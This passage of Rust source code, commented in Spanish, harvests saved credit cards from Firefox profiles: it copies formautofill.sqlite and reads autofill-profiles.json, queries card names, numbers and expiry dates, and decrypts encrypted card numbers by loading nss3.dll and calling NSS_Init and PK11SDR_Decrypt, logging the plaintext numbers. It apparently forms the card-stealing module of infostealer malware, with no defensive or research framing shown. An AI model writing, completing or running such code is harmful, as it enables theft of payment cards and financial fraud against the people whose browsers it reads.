                                        log(&format!("      Nombre: {}", name));
                                        log(&format!("      Exp: {}/{}", exp_month, exp_year));
                                        log(&format!("      Encrypted (Base64): {}", encrypted_number));
                                        
                                        // Desencriptar con NSS
                                        if !encrypted_number.is_empty() {
                                            match decrypt_firefox_nss(&profile_path, encrypted_number, &mut log) {
                                                Ok(decrypted_number) => {
                                                    log(&format!("      ✅ DECRYPTED: {}", decrypted_number));
                                                    
                                                    // Agregar a resultados
                                                    cards.push(CreditCard {
                                                        browser: "Firefox".to_string(),
                                                        name_on_card: name.to_string(),
                                                        card_number: decrypted_number,
                                                        expiration_month: exp_month as i32,
                                                        expiration_year: exp_year as i32,
                                                        billing_address: None,
                                                        nickname: None,
                                                    });
                                                },
                                                Err(e) => {
                                                    log(&format!("      ❌ NSS Decrypt failed: {}", e));
                                                }
                                            }
                                        }
                                    }
                                }
                            } else {
                                log("    ❌ Error parseando JSON");
                            }
                        } else {
                            log("    ❌ Error leyendo archivo");
                        }
                    } else {
                        log("    ⚠️  autofill-profiles.json tampoco existe");
                    }
                    
                    continue;
                }
                
                log("    ✅ DB ENCONTRADO!");
                
                // Copiar a temp (puede estar locked)
                let temp_db = std::env::temp_dir().join(format!("ff_cards_{}.db", std::process::id()));
                log(&format!("    📋 Copiando a: {}", temp_db.display()));
                
                if std::fs::copy(&formautofill_db, &temp_db).is_err() {
                    log("    ❌ Error copiando DB");
                    continue;
                }
                
                log("    ✅ DB copiado, extrayendo tarjetas...");
                
                // Extraer tarjetas
                match extract_firefox_credit_cards_from_db(&temp_db, &mut log) {
                    Ok(profile_cards) => {
                        log(&format!("    🎯 Extraídas {} tarjetas", profile_cards.len()));
                        cards.extend(profile_cards);
                    },
                    Err(e) => {
                        log(&format!("    ❌ Error: {}", e));
                    }
                }
                
                // Limpiar temp
                let _ = std::fs::remove_file(&temp_db);
            }
        }
    } else {
        log("  ❌ Error leyendo directorio de perfiles");
    }
    
    log(&format!("  🏁 Total tarjetas: {}", cards.len()));
    
    cards
}

/// Extrae credit cards de formautofill.sqlite de Firefox
fn extract_firefox_credit_cards_from_db<F>(db_path: &PathBuf, log: &mut F) -> Result<Vec<CreditCard>, String> 
where
    F: FnMut(&str),
{
    log(&format!("      🗄️  Abriendo DB..."));
    
    let conn = Connection::open(db_path)
        .map_err(|e| format!("Failed to open Firefox DB: {}", e))?;
    
    log("      ✅ DB abierta");
    
    let mut cards = Vec::new();
    
    // Verificar si existe la tabla credit_cards_data
    let table_exists: bool = conn
        .query_row(
            "SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards_data'",
            [],
            |_| Ok(true)
        )
        .unwrap_or(false);
    
    if !table_exists {
        log("      ⚠️  Tabla credit_cards_data NO EXISTE");
        
        // INTENTO 2: Tabla alternativa credit_cards_encrypted
        log("      🔍 Buscando tabla credit_cards_encrypted...");
        let alt_table_exists: bool = conn
            .query_row(
                "SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards_encrypted'",
                [],
                |_| Ok(true)
            )
            .unwrap_or(false);
        
        if !alt_table_exists {
            log("      ❌ Ninguna tabla de tarjetas encontrada");
            
            // DEBUG: Listar TODAS las tablas
            log("      📋 TODAS LAS TABLAS EN LA DB:");
            if let Ok(mut stmt) = conn.prepare("SELECT name FROM sqlite_master WHERE type='table'") {
                if let Ok(table_iter) = stmt.query_map([], |row| row.get::<_, String>(0)) {
                    for (idx, table_result) in table_iter.enumerate() {
                        if let Ok(table_name) = table_result {
                            log(&format!("        {}. {}", idx + 1, table_name));
                        }
                    }
                }
            }
            
            return Ok(cards);
        }
    }
    
    log("      ✅ Tabla credit_cards_data existe");
    
    // DEBUG: Mostrar estructura de la tabla
    log("      📋 COLUMNAS DE credit_cards_data:");
    if let Ok(mut stmt) = conn.prepare("PRAGMA table_info(credit_cards_data)") {
        if let Ok(col_iter) = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(1)?,  // column name
                row.get::<_, String>(2)?,  // column type
            ))
        }) {
            for (idx, col_result) in col_iter.enumerate() {
                if let Ok((col_name, col_type)) = col_result {
                    log(&format!("        {}. {} ({})", idx + 1, col_name, col_type));
                }
            }
        }
    }
    
    // DEBUG: Mostrar una fila de ejemplo (data RAW)
    log("      📄 EJEMPLO DE FILA (raw data):");
    if let Ok(mut stmt) = conn.prepare("SELECT * FROM credit_cards_data LIMIT 1") {
        if let Ok(mut rows) = stmt.query([]) {
            if let Ok(Some(row)) = rows.next() {
                let col_count = row.as_ref().column_count();
                for i in 0..col_count {
                    let col_name = row.as_ref().column_name(i).unwrap_or("unknown");
                    
                    // Intentar leer como texto
                    if let Ok(val) = row.get::<_, String>(i) {
                        log(&format!("        {}: '{}'", col_name, val));
                    }
                    // Intentar leer como binario
                    else if let Ok(val) = row.get::<_, Vec<u8>>(i) {
                        log(&format!("        {}: <{} bytes binarios>", col_name, val.len()));
                    }
                    // Intentar leer como número
                    else if let Ok(val) = row.get::<_, i64>(i) {
                        log(&format!("        {}: {}", col_name, val));
                    }
                }
            } else {
                log("        (sin filas)");
            }
        }
    }
    
    // Contar filas
    let row_count: i64 = conn
        .query_row("SELECT COUNT(*) FROM credit_cards_data", [], |row| row.get(0))
        .unwrap_or(0);
    
    log(&format!("      📊 Filas en tabla: {}", row_count));
    
    if row_count == 0 {
        log("      ⚠️  Tabla VACÍA");
        return Ok(cards);
    }
    
    // Firefox almacena tarjetas en la tabla: credit_cards_data
    // Campos: guid, cc-name, cc-number, cc-exp-month, cc-exp-year, cc-type, timeCreated, timeLastUsed, timeLastModified, timesUsed
    log("      🔍 Ejecutando query...");
    
    let mut stmt = conn.prepare(
        "SELECT guid, json_extract(data, '$.cc-name'), json_extract(data, '$.cc-number'), \
         json_extract(data, '$.cc-exp-month'), json_extract(data, '$.cc-exp-year') \
         FROM credit_cards_data"
    ).map_err(|e| format!("Failed to prepare statement: {}", e))?;
    
    log("      ✅ Query preparada");
    
    let card_iter = stmt.query_map([], |row| {
        Ok((
            row.get::<_, String>(0)?,  // guid
            row.get::<_, Option<String>>(1)?,  // name
            row.get::<_, Option<String>>(2)?,  // number (puede estar encriptado)
            row.get::<_, Option<i32>>(3)?,     // exp month
            row.get::<_, Option<i32>>(4)?,     // exp year
        ))
    }).map_err(|e| format!("Query failed: {}", e))?;
    
    log("      🔄 Iterando resultados...");
    
    let mut row_num = 0;
    for card_result in card_iter {
        row_num += 1;
        log(&format!("      📄 Fila #{}: {:?}", row_num, card_result));
        
        if let Ok((_guid, name, number, exp_month, exp_year)) = card_result {
            log(&format!("        👤 Nombre: {:?}", name));
            log(&format!("        💳 Número: {:?}", number));
            log(&format!("        📅 Exp: {:?}/{:?}", exp_month, exp_year));
            
            // Firefox PUEDE almacenar números encriptados (depende de configuración)
            // Por ahora intentamos usarlos directamente
            
            if let (Some(card_number), Some(month), Some(year)) = (number, exp_month, exp_year) {
                log(&format!("        ✅ Todos los campos presentes"));
                
                // Validar que el número no esté encriptado (si empieza con caracteres extraños, skip)
                let is_valid = card_number.chars().all(|c| c.is_ascii_digit() || c.is_whitespace() || c == '-');
                
                log(&format!("        🔍 Validación ASCII: {}", is_valid));
                
                if is_valid {
                    log(&format!("        ✅ TARJETA VÁLIDA ENCONTRADA!"));
                    
                    cards.push(CreditCard {
                        browser: "Firefox".to_string(),
                        name_on_card: name.unwrap_or_default(),
                        card_number: card_number.trim().to_string(),
                        expiration_month: month,
                        expiration_year: year,
                        billing_address: None,
                        nickname: None,
                    });
                } else {
                    log("        ⚠️  Número no válido (encriptado/binario)");
                }
            } else {
                log("        ⚠️  Campos faltantes");
            }
        } else {
            log(&format!("        ❌ Error parseando fila: {:?}", card_result));
        }
    }
    
    log(&format!("      🏁 Total extraídas: {}", cards.len()));
    
    Ok(cards)
}

/// Desencripta datos de Firefox usando NSS3.dll
fn decrypt_firefox_nss<F>(profile_path: &std::path::Path, encrypted_b64: &str, log: &mut F) -> Result<String, String>
where
    F: FnMut(&str),
{
    use libloading::{Library, Symbol};
    use std::os::raw::{c_char, c_int, c_void};
    
    log("      🔐 [NSS] Iniciando decrypt...");
    
    // Decodificar Base64
    let encrypted_data = match general_purpose::STANDARD.decode(encrypted_b64) {
        Ok(data) => {
            log(&format!("      📦 Base64 decoded: {} bytes", data.len()));
            data
        },
        Err(e) => return Err(format!("Base64 decode failed: {}", e))
    };
    
    // Buscar nss3.dll en el perfil de Firefox
    let nss_dll = profile_path.parent()
        .and_then(|p| p.parent())
        .map(|firefox_root| firefox_root.join("nss3.dll"))
        .ok_or("No se pudo construir path a nss3.dll")?;
    
    log(&format!("      🔍 Buscando NSS3: {}", nss_dll.display()));
    
    if !nss_dll.exists() {
        return Err(format!("nss3.dll no encontrado en: {}", nss_dll.display()));
    }
    
    log("      ✅ nss3.dll ENCONTRADO");
    
    // Cargar biblioteca
    let lib = unsafe {
        match Library::new(&nss_dll) {
            Ok(l) => {
                log("      ✅ Library cargada");
                l
            },
            Err(e) => return Err(format!("Failed to load nss3.dll: {}", e))
        }
    };
    
    // Definir estructuras NSS
    #[repr(C)]
    struct SECItem {
        typ: c_int,
        data: *mut u8,
        len: c_int,
    }
    
    // Cargar funciones
    unsafe {
        log("      🔧 Cargando funciones NSS...");
        
        // NSS_Init inicializa NSS con el perfil
        let nss_init: Symbol<unsafe extern "C" fn(*const c_char) -> c_int> = 
            lib.get(b"NSS_Init\0")
                .map_err(|e| format!("NSS_Init not found: {}", e))?;
        
        // PK11SDR_Decrypt desencripta datos
        let pk11_decrypt: Symbol<unsafe extern "C" fn(*mut SECItem, *mut SECItem, *mut c_void) -> c_int> = 
            lib.get(b"PK11SDR_Decrypt\0")
                .map_err(|e| format!("PK11SDR_Decrypt not found: {}", e))?;
        
        log("      ✅ Funciones cargadas");
        
        // Inicializar NSS con el perfil
        let profile_c = std::ffi::CString::new(profile_path.to_string_lossy().as_ref())
            .map_err(|_| "Invalid profile path")?;
        
        log(&format!("      🚀 Inicializando NSS con perfil: {}", profile_path.display()));
        
        let init_result = nss_init(profile_c.as_ptr());
        if init_result != 0 {
            log(&format!("      ⚠️  NSS_Init returned: {} (puede ser OK si ya inicializado)", init_result));
        } else {
            log("      ✅ NSS_Init OK");
        }
        
        // Preparar input SECItem
        let mut encrypted_item = SECItem {
            typ: 0,
            data: encrypted_data.as_ptr() as *mut u8,
            len: encrypted_data.len() as c_int,
        };
        
        // Output SECItem
        let mut decrypted_item = SECItem {
            typ: 0,
            data: std::ptr::null_mut(),
            len: 0,
        };
        
        log("      🔓 Llamando PK11SDR_Decrypt...");
        
        let decrypt_result = pk11_decrypt(&mut encrypted_item, &mut decrypted_item, std::ptr::null_mut());
        
        if decrypt_result != 0 {
            return Err(format!("PK11SDR_Decrypt failed with code: {}", decrypt_result));
        }
        
        log("      ✅ Decrypt SUCCESS!");
        
        // Convertir resultado a String
        if decrypted_item.data.is_null() || decrypted_item.len == 0 {
            return Err("Decrypted data is empty".to_string());
        }
        
        let decrypted_slice = std::slice::from_raw_parts(
            decrypted_item.data,
            decrypted_item.len as usize
        );
        
        let result = String::from_utf8_lossy(decrypted_slice).to_string();
        
        log(&format!("      💳 Plaintext: {}", result));
        
        // TODO: Liberar memoria con SECITEM_FreeItem si es necesario
        // Por ahora lo omitimos para simplicidad
        
        Ok(result)
    }
}
